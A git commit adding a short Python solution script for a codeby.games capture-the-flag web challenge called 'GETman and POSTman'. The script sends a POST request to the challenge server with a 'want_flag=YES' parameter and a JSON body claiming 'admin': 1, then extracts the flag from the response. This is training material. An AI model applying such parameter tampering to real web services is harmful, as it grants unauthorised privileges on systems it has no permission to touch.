8a57023f0d0299b6736edc524e09f0904ce14b79
Euthanazepam <euthanazepam@protonmail.com>
2024-07-07 19:39:44 +0000

    #add #web - GETman and POSTman

---
+++ Web/GETman and POSTman/getman_and_postman.py
@@ -0,0 +1,22 @@
+from requests import post
+
+
+def get_flag() -> str:
+    """
+    https://codeby.games/en/categories/web/ca07034b-bde4-4c87-bc9d-bccea9cc9dd1
+    """
+
+    base_url = 'http://62.173.140.174'
+    port = 16002
+    query_param = 'want_flag=YES'
+    payload = {"admin": 1, "message": "Hello"}
+
+    response = post(f'{base_url}:{port}?{query_param}', json=payload)
+
+    flag = response.text.split('\n')[-1].split(': ')[-1]
+
+    return flag
+
+
+if __name__ == '__main__':
+    print(get_flag())
